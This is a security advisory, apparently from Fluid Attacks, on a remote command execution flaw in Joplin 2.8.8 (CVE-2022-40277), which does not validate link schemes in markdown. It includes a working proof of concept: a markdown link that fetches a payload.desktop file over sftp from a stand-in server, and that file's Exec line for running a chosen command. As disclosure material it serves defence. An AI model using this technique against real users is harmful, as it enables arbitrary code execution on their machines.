---
slug: advisories/skrillex/
title: Joplin 2.8.8  -  Remote Command Execution
authors: Carlos Bello
writer: cbello
codename: skrillex
product: Joplin 2.8.8
date: 2022-09-26 17:00 COT
cveid: CVE-2022-40277
severity: 7.7
description: Joplin 2.8.8  -  Remote Command Execution - Remote command execution
keywords: Fluid Attacks, Security, Vulnerabilities, Joplin, Exploitation
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                        |
| --------------------- | -------------------------------------------------------|
| **Name**              | Joplin 2.8.8  -  Remote Command Execution              |
| **Code name**         | [Skrillex](https://en.wikipedia.org/wiki/Skrillex)     |
| **Product**           | Joplin                                                 |
| **Affected versions** | Version 2.8.8                                          |
| **State**             | Public                                                 |
| **Release date**      | 2022-09-26                                             |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | ------------------------------------------------------------------------------------------------------ |
| **Kind**              | Remote command execution                                                                               |
| **Rule**              | [004. Remote command execution](https://docs.fluidattacks.com/criteria/vulnerabilities/004)            |
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H                                                           |
| **CVSSv3 Base Score** | 7.7                                                                                                    |
| **Exploit available** | Yes                                                                                                    |
| **CVE ID(s)**         | [CVE-2022-40277](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40277)                        |

## Description

Joplin version 2.8.8 allows an external attacker to execute arbitrary
commands remotely on any client that opens a link in a malicious
markdown file, via Joplin. This is possible because the application
does not properly validate the schema/protocol of existing links in
the markdown file before passing them to the shell.openExternal
function.

## Vulnerability

This vulnerability occurs due to improper scheme/protocol validation
of external URLs. Here is a small example to give you a better
understanding of vulnerability.

![image](https://user-images.githubusercontent.com/51862990/189775403-75f4e110-50f0-4afb-8cd6-63dd2c651b16.png)

Basically what the application is doing is sending to
shell.openExternal(url), any url present in the markdown
file.

## Exploitation requirements

To achieve the RCE, the attacker will abuse certain schemes/protocols.
Some of these only work on windows, others on MACos, others only work
correctly under certain specific Linux distributions. In my case, I
used Xubuntu 20.04 (Xfce) to simulate a victim. I chose this
distribution because in its default configuration it executes the
payload.desktop file after mounting the remote location where the
payload file is located. In other Linux distributions by default these
files are not executed once the remote location is mounted.

In the resources section I will provide you with support material so
that you can understand in greater depth what I have just explained.

## Exploitation

To exploit this vulnerability, you must send the following file to a
user to open with Joplin:

### exploit.md

```markdown
[exploit](sftp://user@server/uploads/payload.desktop)
```

### payload.desktop

In the Exec parameter you put the command you want the victim to execute.

```txt
[Desktop Entry]
Exec=xmessage "RCE by cbelloatfluid"
Type=Application
```

## Evidence of exploitation

![RCE-Joplin](https://user-images.githubusercontent.com/51862990/189775676-83553248-0452-4df4-a9c1-7b65bbbe4792.gif)

## Our security policy

We have reserved the CVE-2022-40277 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Joplin 2.8.8

* Operating System: GNU/Linux - Xubuntu 20.04 (Xfce)

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/laurent22/joplin>

## Timeline

<time-lapse
  discovered="2022-09-07"
  contacted="2022-09-08"
  replied=""
  confirmed=""
  patched=""
  disclosure="2022-09-26">
</time-lapse>
